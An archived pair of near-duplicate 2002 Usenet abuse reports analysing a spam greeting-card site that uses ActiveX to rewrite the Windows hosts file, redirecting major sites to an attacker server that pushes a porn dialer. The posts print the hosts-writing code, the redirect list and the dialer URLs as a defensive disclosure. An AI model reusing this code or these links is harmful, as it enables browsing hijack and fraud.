@@ -1,0 +1,2489 @@
+From af380@chebucto.ns.ca Sat Feb 23 20:55:11 2002
+Status: RO
+X-Status: 
+From: John McGowan <jmcgowan@shell.inch.com>
+Subject: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Surprise! You've just received a greeting card!
+Newsgroups: news.admin.net-abuse.email
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c7847ff$1_1@nntp2.nac.net>
+Date: 23 Feb 2002 20:55:11 -0500
+X-Trace: nntp2.nac.net 1014515711 inch.com (23 Feb 2002 20:55:11 -0500)
+Lines: 370
+Path: News.Dal.Ca!newsflash.concordia.ca!sunqbc.risq.qc.ca!news.maxwell.syr.edu!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!jmcgowan
+Xref: News.Dal.Ca news.admin.net-abuse.email:766591
+
+Do NOT go to ""http://Best-Greeting.com/" if you have IE, ActiveX,
+scripting, etc. unless you would like your Web connection to be
+stolen.
+
+SPAMVERTIZED URL: "http://Best-Greeting.com/view.html?EFC9EWBKFJYAR"
+--------------------------------------------------------------------
+ Interesting. This page has:
+
+   "Sorry,
+    We are closed for scheduled maintance
+    Please come back in a few hours to view and send your postcards"
+
+ However, that is below the encrypted JavaScript section which does
+ a document write (after decrypting) of:
+
+  "var label="Free Bisexual Pics & Videos";     //Labelvar
+   url="http://www.bitgp.com/";                 //To URLvar" ...
+
+  What does it do? It uses ActiveX to do ... what?
+
+  ACTIVEX CODE:
+  -----------------------------------------------------
+  function savefavfile(folder,label,url,icofile,iconum)
+   var oFi=FSO.CreateTextFile(folder+"\\hosts");
+    oFi.WriteLine("64.154.222.199 hotmail.com");
+    oFi.WriteLine("64.154.222.199 yahoo.com");
+    ...
+   [ETC. THE FULL LIST IS BELOW THE INDIVIDUALLY ADDRESSES
+    SECTIONS]
+    ...
+    oFi.Close();}
+  -----------------------------------------------------
+
+  Let me guess what that does. It creates a "hosts" file.
+  A "hosts" file is used (if it exists) to resolve hostnames
+  (if the hostname is in the hosts file) before using a nameserver.
+  So, if ever again, I try to go anywhere (well, not anywhere, but
+  to any of the major sites listed below) I will be going to:
+  "64.154.222.199"
+  -----------------------------------------------------------
+
+  What does the hosts file do? It redirects a lot (most? all?) of
+  your browsing to the spammer's system at IP address 64.154.222.199.
+  What does that site do when you are trying to browse the web?
+
+  There are two possibilities. The spammer has his own list of IP
+  addresses for the hosts listed below (this list is on his server
+  at IP address 64.154.222.199). When you attempt to go to, for
+  example, "http://geocities.com/myfiles/amy.txt", currently it will
+  LOOK like that's where went. Maybe.
+
+  CURRENTLY the spammer can track a lot (most) of your access to the web
+  (any access using the hosts listed below) and his site does the following:
+
+  It returns a fake "404" header, forged identification (as being
+  AltaVista) and a page which is a frameset.
+
+  The main frame takes up 100% of the rows and is the one you see, full
+  screen. It has its source set to the site you were attempting to reach
+  (but using an IP address rather than the hostname - using the hostname
+  would send you back to the spammer's site again since it is in your
+  "hosts" file).  HOWEVER, the spammer's list of IP addresses for the
+  hostnames is not perfect. For example, for "www.wu.com" (listed below)
+  (this is a Western Union site) the IP address which the spammer's site
+  uses (and to which it redirects the frame) is "206.201.228.250" but
+  www.wu.com has address "63.211.215.124". The site to which you are
+  redirected (frameset redirection) IS a Western Union site, but not quite
+  the right one.  You may NEVER be able to get to the right one, even if the
+  site to which you are directed has a link to it since, if it has a link to
+  "www.wu.com", the fact that this is in your "hosts" file causes you to go
+  to the spammer's site which again (mis)redirects you (frameset
+  redirection).
+
+  There is not just one frame in the frameset (if there were, this would
+  just be a site used for tracking your web use), but a second. As there
+  is no room for it, it is hidden. It points to "dialer.php"
+  (i.e. "http://64.154.222.199/dialer.php") which returns an http-protocol
+  redirect ("302" header) to:
+    "HTTP/1.1 302 Found
+     Location: http://www.0190-dialer.com/autoload.cfm?5-1-25-389"
+  which attempts to download and install a UPX compressed binary -
+  a porn dialer - from
+    "http://download2.0190-dialer.com/dialers/5-1-25-389.exe".
+
+  EXAMPLE: "geocities.com" is listed below so one will go to the
+            spammer's site whenever one tries to go to
+            "http://geocities.com/anything".
+            What happens?
+            Let me go to: 'http://64.154.222.199/myfiles/amy.txt'
+            BUT MANUALLY set the "Host:" field in the http header
+            that is sent to be "Host: geocities.com". This is what one gets.
+
+             1: A fake "404" HTTP header -
+             2: Forged meta-tag entries and identity
+               [meta name="description" content="AltaVista provides the most
+                comprehensive search experience on the Web!"]
+             3: A frameset with two frames:
+                [FRAMESET rows="100%,*" framespacing=0 frameborder="no"]
+                [FRAME SRC="http://209.1.225.218/myfiles/amy.txt" noresize ]
+                [FRAME src="dialer.php" noresize]
+                [/frameset]
+
+               where PING geocities.com (209.1.225.218)
+               (thus, in this case, what you see is "geocities.com" - just
+                as you expected and don't know that anything has happened).
+
+            Thus, while you browse, you are continually checked for having
+            the spammer's porn dialer installed and it will be reinstalled
+            if you remove it. He can also track your every (well, almost
+            every, if you mainly use the most popular and largest sites)
+            move on the web.
+
+   IF the spammer's site does NOT have an IP address for the "Host:" header,
+   it just does a "302" (http protocol header - server redirect) to the
+   spammer's porn site (in the same block as the connection stealing site):
+
+             "HTTP/1.1 302 Found
+              Location: http://www.dryporn.com"
+
+   (I got that by trying such things as going to
+    'http://64.154.222.199/somepath' and manually setting the "Host:" field
+    in the header to things like "Host: www.nytimes.com" which is NOT in the
+    list below.)
+
+    NOTE: "http://www.dryporn.com" ALSO ATTEMPTS TO LOAD AND INSTALL
+          THIS SAME PORN DIALER.
+           The URL "http://www.dryporn.com" redirects to its starting
+           page 'http://www.dryporn.com/index1.shtml?' which has the
+           onUnload() code (which will run when you attempt to leave
+           the site):
+            window.open('http://www.0190-dialer.com/autoload.cfm?5-1-26-55'...)
+          ... well, OK, I lied ... it attempts to load the dialer:
+          "http://download2.0190-dialer.com/dialers/5-1-26-55.exe"
+          which is a different porn dialer on "download2.0190-dialer.com".
+
+  THAT IS WHAT HAPPENS CURRENTLY. However, once this "hosts" file is in your
+  system the spammer has complete control over what you get when going to
+  a host listed in the "hosts" file he has created for you.
+  
+  If you go to the spamvertized site insecurely you have just given the
+  spammer full and complete control over your web browsing (well, for
+  any of the many popular sites listed below).
+
+  While it currently just surreptitiously installs a porn dialer (and
+  continually checks for it as you browse and reinstalls it if it is not
+  installed), next week it may install a back-door Trojan. The week after, it
+  may not redirect you to the site you desire, but send your every request
+  to some porn site(s).
+
+  With this "hosts" file created on your computer the spammer has stolen
+  your connection and can track your every (well, not every, but all
+  connections to the many popular sites he has listed in the "hosts" file he
+  has created) move on the web - and can control your browsing as he sees
+  fit.
+
+========================================
+LOCATIONS: [WHO IS RESPONSIBLE FOR
+            THIS TROJAN "hosts" FILE AND
+            CONNECTION THEFT]
+========================================
+
+(as this is so egregious, I am including other addresses besides
+ those listed at abuse.net - when I LARTed them, I wanted to
+ make sure this was not passed over by some abuse handler who
+ is not too interested)
+
+  TROJAN INSTALLER (spamvertized URL):
+   (this site creates the Trojan "hosts" file)
+  --------------------------------------------
+          'http://Best-Greeting.com/view.html?EFC9EWBKFJYAR'
+   * Connected to Best-Greeting.com (66.79.10.217)
+      66.79.10.217 is dn7.directnic.com
+      abuse.net addresses:
+        abuse@directnic.com,hostmaster@directnic.com
+     IPQuery: 66.79.10.217
+     Registry:  whois.arin.net
+      Mebtel Communications (NETBLK-MEBTEL-BLK-3)
+       Contact: Perkins, Kirt  (KP274)  perkinsk@MEBTEL.COM
+       [whois.abuse.net] abuse@madisonriver.net (for mebtel.net)
+       SOA: hostmaster@madisonriver.net
+      Intercosmos Media Group, Inc. (NETBLK-MEBT-66-79-10)
+          66.79.10.0-66.79.10.255
+
+  CONNECTION THEFT SITE
+   (the site to which one continually goes when browsing
+   once the "hosts" file is created):
+  ------------------------------------------------------
+     IP ADDRESS: 64.154.222.199
+     (from "hosts" file that is created:
+       oFi.WriteLine("64.154.222.199 hotmail.com")
+       oFi.WriteLine("64.154.222.199 yahoo.com")
+       etc.)
+
+     64.154.222.199 is unknown.Level3.net
+     abuse.net addresses:  Spamtool@level3.com (for level3.net)
+     Contact: support@LEVEL3.COM
+     SOA: hostmaster@Level3.net
+
+  SECRETLY INSTALLED PORN DIALER:
+  -------------------------------
+     (this is the porn dialer that the connection theft site continually
+      checks is on your system - currently. Of course, it can change how
+      it acts at any time).
+             "http://download2.0190-dialer.com/dialers/5-1-25-389.exe"
+      * Connected to download2.0190-dialer.com (62.4.93.13)
+       IPQuery: 62.4.93.13
+       Registry:  whois.ripe.net
+       inetnum:      62.4.93.0 - 62.4.93.255  <-- Just a C-block.
+       netname:      INTERNET-SOLUTIONS
+       descr:        internet solutions GmbH
+       descr:        Frankfurter Str. 1-5
+       descr:        65760 Eschborn
+       descr:        Germany
+       country:      DE
+       admin-c:      RK257-RIPE r_keen@keen.de
+
+       Since this is just a C-block, it may be the spammer's so I will
+       also notify the upstream:
+
+        traceroute to 62.4.93.13
+        ...
+        13  internetsolutions.fra2.mfn.com (62.4.65.20)
+        14  62.4.93.13 (62.4.93.13)
+
+        [whois.abuse.net] abuse@mfn.com, postmaster@mfn.com
+
+  SPAMMER'S PORN SITE:
+  --------------------
+     If the spammer's database does not currently have an IP address for the
+     host you are trying to reach, it redirects you to:
+             "http://www.dryporn.com"
+                    "www.dryporn.com is a nickname (alias) for
+                     the Canonical NAME "dryporn.com"
+          * Connected to dryporn.com (64.154.222.191)
+
+     This is in the same netblock as the connection stealing site
+     (which is at IP address 64.154.222.199) on Level3.
+
+======================================================================
+I am omitting the individually addressed sections included in the LART
+======================================================================
+
+=================================================================
+FULL LIST OF THE ENTRIES WRITTEN TO YOUR NEW TROJAN "hosts" FILE:
+=================================================================
+
+(this gives the hostnames whose connections the spammer has attempted
+ to steal)
+
+  function savefavfile(folder,label,url,icofile,iconum)
+   var oFi=FSO.CreateTextFile(folder+"\\hosts");
+    oFi.WriteLine("64.154.222.199 hotmail.com");
+    oFi.WriteLine("64.154.222.199 yahoo.com");
+    oFi.WriteLine("64.154.222.199 msn.com");
+    oFi.WriteLine("64.154.222.199 altavista.com");
+    oFi.WriteLine("64.154.222.199 google.com");
+    oFi.WriteLine("64.154.222.199 paypal.com");
+    oFi.WriteLine("64.154.222.199 ebay.com");
+    oFi.WriteLine("64.154.222.199 buy.com");
+    oFi.WriteLine("64.154.222.199 microsoft.com");
+    oFi.WriteLine("64.154.222.199 icq.com");
+    oFi.WriteLine("64.154.222.199 usa.net");
+    oFi.WriteLine("64.154.222.199 usa.com");
+    oFi.WriteLine("64.154.222.199 netscape.net");
+    oFi.WriteLine("64.154.222.199 netscape.com");
+    oFi.WriteLine("64.154.222.199 aol.com");
+    oFi.WriteLine("64.154.222.199 web.de");
+    oFi.WriteLine("64.154.222.199 excite.com");
+    oFi.WriteLine("64.154.222.199 qwest.net");
+    oFi.WriteLine("64.154.222.199 dell.com");
+    oFi.WriteLine("64.154.222.199 hp.com");
+    oFi.WriteLine("64.154.222.199 sony.com");
+    oFi.WriteLine("64.154.222.199 gateway.com");
+    oFi.WriteLine("64.154.222.199 ibm.com");
+    oFi.WriteLine("64.154.222.199 bestbuy.com");
+    oFi.WriteLine("64.154.222.199 prodigy.net");
+    oFi.WriteLine("64.154.222.199 att.com");
+    oFi.WriteLine("64.154.222.199 att.net");
+    oFi.WriteLine("64.154.222.199 earthlink.net");
+    oFi.WriteLine("64.154.222.199 earthlink.com");
+    oFi.WriteLine("64.154.222.199 mail.com");
+    oFi.WriteLine("64.154.222.199 lycos.com");
+    oFi.WriteLine("64.154.222.199 av.com");
+    oFi.WriteLine("64.154.222.199 mp3.com");
+    oFi.WriteLine("64.154.222.199 hollywood.com");
+    oFi.WriteLine("64.154.222.199 cnn.com");
+    oFi.WriteLine("64.154.222.199 nba.com");
+    oFi.WriteLine("64.154.222.199 nhl.com");
+    oFi.WriteLine("64.154.222.199 nfl.com");
+    oFi.WriteLine("64.154.222.199 usatoday.com");
+    oFi.WriteLine("64.154.222.199 weather.com");
+    oFi.WriteLine("64.154.222.199 money.com");
+    oFi.WriteLine("64.154.222.199 geocities.com");
+    oFi.WriteLine("64.154.222.199 amazon.com");
+    oFi.WriteLine("64.154.222.199 bankamerica.com");
+    oFi.WriteLine("64.154.222.199 wu.com");
+    oFi.WriteLine("64.154.222.199 westernunion.com");
+    oFi.WriteLine("64.154.222.199 c2it.com");
+    oFi.WriteLine("64.154.222.199 visa.com");
+    oFi.WriteLine("64.154.222.199 internet.com");
+    oFi.WriteLine("64.154.222.199 ivillage.com");
+    oFi.WriteLine("64.154.222.199 real.com");
+    oFi.WriteLine("64.154.222.199 x10.com");
+    oFi.WriteLine("64.154.222.199 about.com");
+    oFi.WriteLine("64.154.222.199 www.hotmail.com");
+    oFi.WriteLine("64.154.222.199 www.yahoo.com");
+    oFi.WriteLine("64.154.222.199 www.msn.com");
+    oFi.WriteLine("64.154.222.199 www.altavista.com");
+    oFi.WriteLine("64.154.222.199 www.google.com");
+    oFi.WriteLine("64.154.222.199 www.paypal.com");
+    oFi.WriteLine("64.154.222.199 www.ebay.com");
+    oFi.WriteLine("64.154.222.199 www.buy.com");
+    oFi.WriteLine("64.154.222.199 www.microsoft.com");
+    oFi.WriteLine("64.154.222.199 www.icq.com");
+    oFi.WriteLine("64.154.222.199 www.usa.net");
+    oFi.WriteLine("64.154.222.199 www.usa.com");
+    oFi.WriteLine("64.154.222.199 www.netscape.net");
+    oFi.WriteLine("64.154.222.199 www.netscape.com");
+    oFi.WriteLine("64.154.222.199 www.aol.com");
+    oFi.WriteLine("64.154.222.199 www.web.de");
+    oFi.WriteLine("64.154.222.199 www.excite.com");
+    oFi.WriteLine("64.154.222.199 www.qwest.net");
+    oFi.WriteLine("64.154.222.199 www.dell.com");
+    oFi.WriteLine("64.154.222.199 www.hp.com");
+    oFi.WriteLine("64.154.222.199 www.sony.com");
+    oFi.WriteLine("64.154.222.199 www.gateway.com");
+    oFi.WriteLine("64.154.222.199 www.ibm.com");
+    oFi.WriteLine("64.154.222.199 www.bestbuy.com");
+    oFi.WriteLine("64.154.222.199 www.prodigy.net");
+    oFi.WriteLine("64.154.222.199 www.att.com");
+    oFi.WriteLine("64.154.222.199 www.att.net");
+    oFi.WriteLine("64.154.222.199 www.earthlink.net");
+    oFi.WriteLine("64.154.222.199 www.earthlink.com");
+    oFi.WriteLine("64.154.222.199 www.mail.com");
+    oFi.WriteLine("64.154.222.199 www.lycos.com");
+    oFi.WriteLine("64.154.222.199 www.av.com");
+    oFi.WriteLine("64.154.222.199 www.mp3.com");
+    oFi.WriteLine("64.154.222.199 www.hollywood.com");
+    oFi.WriteLine("64.154.222.199 www.cnn.com");
+    oFi.WriteLine("64.154.222.199 www.nba.com");
+    oFi.WriteLine("64.154.222.199 www.nhl.com");
+    oFi.WriteLine("64.154.222.199 www.nfl.com");
+    oFi.WriteLine("64.154.222.199 www.usatoday.com");
+    oFi.WriteLine("64.154.222.199 www.weather.com");
+    oFi.WriteLine("64.154.222.199 www.money.com");
+    oFi.WriteLine("64.154.222.199 www.geocities.com");
+    oFi.WriteLine("64.154.222.199 www.amazon.com");
+    oFi.WriteLine("64.154.222.199 www.bankamerica.com");
+    oFi.WriteLine("64.154.222.199 www.wu.com");
+    oFi.WriteLine("64.154.222.199 www.westernunion.com");
+    oFi.WriteLine("64.154.222.199 www.c2it.com");
+    oFi.WriteLine("64.154.222.199 www.visa.com");
+    oFi.WriteLine("64.154.222.199 www.internet.com");
+    oFi.WriteLine("64.154.222.199 www.ivillage.com");
+    oFi.WriteLine("64.154.222.199 www.real.com");
+    oFi.WriteLine("64.154.222.199 www.x10.com");
+    oFi.WriteLine("64.154.222.199 www.about.com");
+    ...
+    oFi.Close();}
+=========================================================
+
+======================
+ORIGINAL SPAM: OMITTED
+======================
+
+[I think I got it right - but for this one, the LART was long -
+ but what can one do? Encrypted JavaScript, ActiveX,
+ Trojan hosts file, web connection stealing site, what it does
+ (porn dialer install) - I have to list and explain each of
+ those to some extent, at least.]
+
+
+From af380@chebucto.ns.ca Sat Feb 23 20:58:51 2002
+Status: RO
+X-Status: 
+From: spamless@Nil.nil
+Subject: TROJAN "hosts" FILE:WEB CONNECTION THEFT: Surprise! You've just received a greeting card!
+Newsgroups: news.admin.net-abuse.email
+Summary: 
+User-Agent: tin/pre-1.4-980818 ("Laura") (UNIX) (FreeBSD/2.2.7-19980825-SNAP (i386))
+NNTP-Posting-Host: inch.com
+Message-ID: <3c7848db$1_1@nntp2.nac.net>
+Date: 23 Feb 2002 20:58:51 -0500
+X-Trace: nntp2.nac.net 1014515931 inch.com (23 Feb 2002 20:58:51 -0500)
+Lines: 370
+Path: News.Dal.Ca!news2.muc.eurocyber.net!fu-berlin.de!news.maxwell.syr.edu!newspeer1.nac.net!nntp2.nac.net!shell.inch.com!Spamless
+Xref: News.Dal.Ca news.admin.net-abuse.email:766592
+
+Do NOT go to ""http://Best-Greeting.com/" if you have IE, ActiveX,
+scripting, etc. unless you would like your Web connection to be
+stolen.
+
+SPAMVERTIZED URL: "http://Best-Greeting.com/view.html?EFC9EWBKFJYAR"
+--------------------------------------------------------------------
+ Interesting. This page has:
+
+   "Sorry,
+    We are closed for scheduled maintance
+    Please come back in a few hours to view and send your postcards"
+
+ However, that is below the encrypted JavaScript section which does
+ a document write (after decrypting) of:
+
+  "var label="Free Bisexual Pics & Videos";     //Labelvar
+   url="http://www.bitgp.com/";                 //To URLvar" ...
+
+  What does it do? It uses ActiveX to do ... what?
+
+  ACTIVEX CODE:
+  -----------------------------------------------------
+  function savefavfile(folder,label,url,icofile,iconum)
+   var oFi=FSO.CreateTextFile(folder+"\\hosts");
+    oFi.WriteLine("64.154.222.199 hotmail.com");
+    oFi.WriteLine("64.154.222.199 yahoo.com");
+    ...
+   [ETC. THE FULL LIST IS BELOW THE INDIVIDUALLY ADDRESSES
+    SECTIONS]
+    ...
+    oFi.Close();}
+  -----------------------------------------------------
+
+  Let me guess what that does. It creates a "hosts" file.
+  A "hosts" file is used (if it exists) to resolve hostnames
+  (if the hostname is in the hosts file) before using a nameserver.
+  So, if ever again, I try to go anywhere (well, not anywhere, but
+  to any of the major sites listed below) I will be going to:
+  "64.154.222.199"
+  -----------------------------------------------------------
+
+  What does the hosts file do? It redirects a lot (most? all?) of
+  your browsing to the spammer's system at IP address 64.154.222.199.
+  What does that site do when you are trying to browse the web?
+
+  There are two possibilities. The spammer has his own list of IP
+  addresses for the hosts listed below (this list is on his server
+  at IP address 64.154.222.199). When you attempt to go to, for
+  example, "http://geocities.com/myfiles/amy.txt", currently it will
+  LOOK like that's where went. Maybe.
+
+  CURRENTLY the spammer can track a lot (most) of your access to the web
+  (any access using the hosts listed below) and his site does the following:
+
+  It returns a fake "404" header, forged identification (as being
+  AltaVista) and a page which is a frameset.
+
+  The main frame takes up 100% of the rows and is the one you see, full
+  screen. It has its source set to the site you were attempting to reach
+  (but using an IP address rather than the hostname - using the hostname
+  would send you back to the spammer's site again since it is in your
+  "hosts" file).  HOWEVER, the spammer's list of IP addresses for the
+  hostnames is not perfect. For example, for "www.wu.com" (listed below)
+  (this is a Western Union site) the IP address which the spammer's site
+  uses (and to which it redirects the frame) is "206.201.228.250" but
+  www.wu.com has address "63.211.215.124". The site to which you are
+  redirected (frameset redirection) IS a Western Union site, but not quite
+  the right one.  You may NEVER be able to get to the right one, even if the
+  site to which you are directed has a link to it since, if it has a link to
+  "www.wu.com", the fact that this is in your "hosts" file causes you to go
+  to the spammer's site which again (mis)redirects you (frameset
+  redirection).
+
+  There is not just one frame in the frameset (if there were, this would
+  just be a site used for tracking your web use), but a second. As there
+  is no room for it, it is hidden. It points to "dialer.php"
+  (i.e. "http://64.154.222.199/dialer.php") which returns an http-protocol
+  redirect ("302" header) to:
+    "HTTP/1.1 302 Found
+     Location: http://www.0190-dialer.com/autoload.cfm?5-1-25-389"
+  which attempts to download and install a UPX compressed binary -
+  a porn dialer - from
+    "http://download2.0190-dialer.com/dialers/5-1-25-389.exe".
+
+  EXAMPLE: "geocities.com" is listed below so one will go to the
+            spammer's site whenever one tries to go to
+            "http://geocities.com/anything".
+            What happens?
+            Let me go to: 'http://64.154.222.199/myfiles/amy.txt'
+            BUT MANUALLY set the "Host:" field in the http header
+            that is sent to be "Host: geocities.com". This is what one gets.
+
+             1: A fake "404" HTTP header -
+             2: Forged meta-tag entries and identity
+               [meta name="description" content="AltaVista provides the most
+                comprehensive search experience on the Web!"]
+             3: A frameset with two frames:
+                [FRAMESET rows="100%,*" framespacing=0 frameborder="no"]
+                [FRAME SRC="http://209.1.225.218/myfiles/amy.txt" noresize ]
+                [FRAME src="dialer.php" noresize]
+                [/frameset]
+
+               where PING geocities.com (209.1.225.218)
+               (thus, in this case, what you see is "geocities.com" - just
+                as you expected and don't know that anything has happened).
+
+            Thus, while you browse, you are continually checked for having
+            the spammer's porn dialer installed and it will be reinstalled
+            if you remove it. He can also track your every (well, almost
+            every, if you mainly use the most popular and largest sites)
+            move on the web.
+
+   IF the spammer's site does NOT have an IP address for the "Host:" header,
+   it just does a "302" (http protocol header - server redirect) to the
+   spammer's porn site (in the same block as the connection stealing site):
+
+             "HTTP/1.1 302 Found
+              Location: http://www.dryporn.com"
+
+   (I got that by trying such things as going to
+    'http://64.154.222.199/somepath' and manually setting the "Host:" field
+    in the header to things like "Host: www.nytimes.com" which is NOT in the
+    list below.)
+
+    NOTE: "http://www.dryporn.com" ALSO ATTEMPTS TO LOAD AND INSTALL
+          THIS SAME PORN DIALER.
+           The URL "http://www.dryporn.com" redirects to its starting
+           page 'http://www.dryporn.com/index1.shtml?' which has the
+           onUnload() code (which will run when you attempt to leave
+           the site):
+            window.open('http://www.0190-dialer.com/autoload.cfm?5-1-26-55'...)
+          ... well, OK, I lied ... it attempts to load the dialer:
+          "http://download2.0190-dialer.com/dialers/5-1-26-55.exe"
+          which is a different porn dialer on "download2.0190-dialer.com".
+
+  THAT IS WHAT HAPPENS CURRENTLY. However, once this "hosts" file is in your
+  system the spammer has complete control over what you get when going to
+  a host listed in the "hosts" file he has created for you.
+  
+  If you go to the spamvertized site insecurely you have just given the
+  spammer full and complete control over your web browsing (well, for
+  any of the many popular sites listed below).
+
+  While it currently just surreptitiously installs a porn dialer (and
+  continually checks for it as you browse and reinstalls it if it is not
+  installed), next week it may install a back-door Trojan. The week after, it
+  may not redirect you to the site you desire, but send your every request
+  to some porn site(s).
+
+  With this "hosts" file created on your computer the spammer has stolen
+  your connection and can track your every (well, not every, but all
+  connections to the many popular sites he has listed in the "hosts" file he
+  has created) move on the web - and can control your browsing as he sees
+  fit.
+
+========================================
+LOCATIONS: [WHO IS RESPONSIBLE FOR
+            THIS TROJAN "hosts" FILE AND
+            CONNECTION THEFT]
+========================================
+
+(as this is so egregious, I am including other addresses besides
+ those listed at abuse.net - when I LARTed them, I wanted to
+ make sure this was not passed over by some abuse handler who
+ is not too interested)
+
+  TROJAN INSTALLER (spamvertized URL):
+   (this site creates the Trojan "hosts" file)
+  --------------------------------------------
+          'http://Best-Greeting.com/view.html?EFC9EWBKFJYAR'
+   * Connected to Best-Greeting.com (66.79.10.217)
+      66.79.10.217 is dn7.directnic.com
+      abuse.net addresses:
+        abuse@directnic.com,hostmaster@directnic.com
+     IPQuery: 66.79.10.217
+     Registry:  whois.arin.net
+      Mebtel Communications (NETBLK-MEBTEL-BLK-3)
+       Contact: Perkins, Kirt  (KP274)  perkinsk@MEBTEL.COM
+       [whois.abuse.net] abuse@madisonriver.net (for mebtel.net)
+       SOA: hostmaster@madisonriver.net
+      Intercosmos Media Group, Inc. (NETBLK-MEBT-66-79-10)
+          66.79.10.0-66.79.10.255
+
+  CONNECTION THEFT SITE
+   (the site to which one continually goes when browsing
+   once the "hosts" file is created):
+  ------------------------------------------------------
+     IP ADDRESS: 64.154.222.199
+     (from "hosts" file that is created:
+       oFi.WriteLine("64.154.222.199 hotmail.com")
+       oFi.WriteLine("64.154.222.199 yahoo.com")
+       etc.)
+
+     64.154.222.199 is unknown.Level3.net
+     abuse.net addresses:  Spamtool@level3.com (for level3.net)
+     Contact: support@LEVEL3.COM
+     SOA: hostmaster@Level3.net
+
+  SECRETLY INSTALLED PORN DIALER:
+  -------------------------------
+     (this is the porn dialer that the connection theft site continually
+      checks is on your system - currently. Of course, it can change how
+      it acts at any time).
+             "http://download2.0190-dialer.com/dialers/5-1-25-389.exe"
+      * Connected to download2.0190-dialer.com (62.4.93.13)
+       IPQuery: 62.4.93.13
+       Registry:  whois.ripe.net
+       inetnum:      62.4.93.0 - 62.4.93.255  <-- Just a C-block.
+       netname:      INTERNET-SOLUTIONS
+       descr:        internet solutions GmbH
+       descr:        Frankfurter Str. 1-5
+       descr:        65760 Eschborn
+       descr:        Germany
+       country:      DE
+       admin-c:      RK257-RIPE r_keen@keen.de
+
+       Since this is just a C-block, it may be the spammer's so I will
+       also notify the upstream:
+
+        traceroute to 62.4.93.13
+        ...
+        13  internetsolutions.fra2.mfn.com (62.4.65.20)
+        14  62.4.93.13 (62.4.93.13)
+
+        [whois.abuse.net] abuse@mfn.com, postmaster@mfn.com
+
+  SPAMMER'S PORN SITE:
+  --------------------
+     If the spammer's database does not currently have an IP address for the
+     host you are trying to reach, it redirects you to:
+             "http://www.dryporn.com"
+                    "www.dryporn.com is a nickname (alias) for
+                     the Canonical NAME "dryporn.com"
+          * Connected to dryporn.com (64.154.222.191)
+
+     This is in the same netblock as the connection stealing site
+     (which is at IP address 64.154.222.199) on Level3.
+
+======================================================================
+I am omitting the individually addressed sections included in the LART
+======================================================================
+
+=================================================================
+FULL LIST OF THE ENTRIES WRITTEN TO YOUR NEW TROJAN "hosts" FILE:
+=================================================================
+
+(this gives the hostnames whose connections the spammer has attempted
+ to steal)
+
+  function savefavfile(folder,label,url,icofile,iconum)
+   var oFi=FSO.CreateTextFile(folder+"\\hosts");
+    oFi.WriteLine("64.154.222.199 hotmail.com");
+    oFi.WriteLine("64.154.222.199 yahoo.com");
+    oFi.WriteLine("64.154.222.199 msn.com");
+    oFi.WriteLine("64.154.222.199 altavista.com");
+    oFi.WriteLine("64.154.222.199 google.com");
+    oFi.WriteLine("64.154.222.199 paypal.com");
+    oFi.WriteLine("64.154.222.199 ebay.com");
+    oFi.WriteLine("64.154.222.199 buy.com");
+    oFi.WriteLine("64.154.222.199 microsoft.com");
+    oFi.WriteLine("64.154.222.199 icq.com");
+    oFi.WriteLine("64.154.222.199 usa.net");
+    oFi.WriteLine("64.154.222.199 usa.com");
+    oFi.WriteLine("64.154.222.199 netscape.net");
+    oFi.WriteLine("64.154.222.199 netscape.com");
+    oFi.WriteLine("64.154.222.199 aol.com");
+    oFi.WriteLine("64.154.222.199 web.de");
+    oFi.WriteLine("64.154.222.199 excite.com");
+    oFi.WriteLine("64.154.222.199 qwest.net");
+    oFi.WriteLine("64.154.222.199 dell.com");
+    oFi.WriteLine("64.154.222.199 hp.com");
+    oFi.WriteLine("64.154.222.199 sony.com");
+    oFi.WriteLine("64.154.222.199 gateway.com");
+    oFi.WriteLine("64.154.222.199 ibm.com");
+    oFi.WriteLine("64.154.222.199 bestbuy.com");
+    oFi.WriteLine("64.154.222.199 prodigy.net");
+    oFi.WriteLine("64.154.222.199 att.com");
+    oFi.WriteLine("64.154.222.199 att.net");
+    oFi.WriteLine("64.154.222.199 earthlink.net");
+    oFi.WriteLine("64.154.222.199 earthlink.com");
+    oFi.WriteLine("64.154.222.199 mail.com");
+    oFi.WriteLine("64.154.222.199 lycos.com");
+    oFi.WriteLine("64.154.222.199 av.com");
+    oFi.WriteLine("64.154.222.199 mp3.com");
+    oFi.WriteLine("64.154.222.199 hollywood.com");
+    oFi.WriteLine("64.154.222.199 cnn.com");
+    oFi.WriteLine("64.154.222.199 nba.com");
+    oFi.WriteLine("64.154.222.199 nhl.com");
+    oFi.WriteLine("64.154.222.199 nfl.com");
+    oFi.WriteLine("64.154.222.199 usatoday.com");
+    oFi.WriteLine("64.154.222.199 weather.com");
+    oFi.WriteLine("64.154.222.199 money.com");
+    oFi.WriteLine("64.154.222.199 geocities.com");
+    oFi.WriteLine("64.154.222.199 amazon.com");
+    oFi.WriteLine("64.154.222.199 bankamerica.com");
+    oFi.WriteLine("64.154.222.199 wu.com");
+    oFi.WriteLine("64.154.222.199 westernunion.com");
+    oFi.WriteLine("64.154.222.199 c2it.com");
+    oFi.WriteLine("64.154.222.199 visa.com");
+    oFi.WriteLine("64.154.222.199 internet.com");
+    oFi.WriteLine("64.154.222.199 ivillage.com");
+    oFi.WriteLine("64.154.222.199 real.com");
+    oFi.WriteLine("64.154.222.199 x10.com");
+    oFi.WriteLine("64.154.222.199 about.com");
+    oFi.WriteLine("64.154.222.199 www.hotmail.com");
+    oFi.WriteLine("64.154.222.199 www.yahoo.com");
+    oFi.WriteLine("64.154.222.199 www.msn.com");
+    oFi.WriteLine("64.154.222.199 www.altavista.com");
+    oFi.WriteLine("64.154.222.199 www.google.com");
+    oFi.WriteLine("64.154.222.199 www.paypal.com");
+    oFi.WriteLine("64.154.222.199 www.ebay.com");
+    oFi.WriteLine("64.154.222.199 www.buy.com");
+    oFi.WriteLine("64.154.222.199 www.microsoft.com");
+    oFi.WriteLine("64.154.222.199 www.icq.com");
+    oFi.WriteLine("64.154.222.199 www.usa.net");
+    oFi.WriteLine("64.154.222.199 www.usa.com");
+    oFi.WriteLine("64.154.222.199 www.netscape.net");
+    oFi.WriteLine("64.154.222.199 www.netscape.com");
+    oFi.WriteLine("64.154.222.199 www.aol.com");
+    oFi.WriteLine("64.154.222.199 www.web.de");
+    oFi.WriteLine("64.154.222.199 www.excite.com");
+    oFi.WriteLine("64.154.222.199 www.qwest.net");
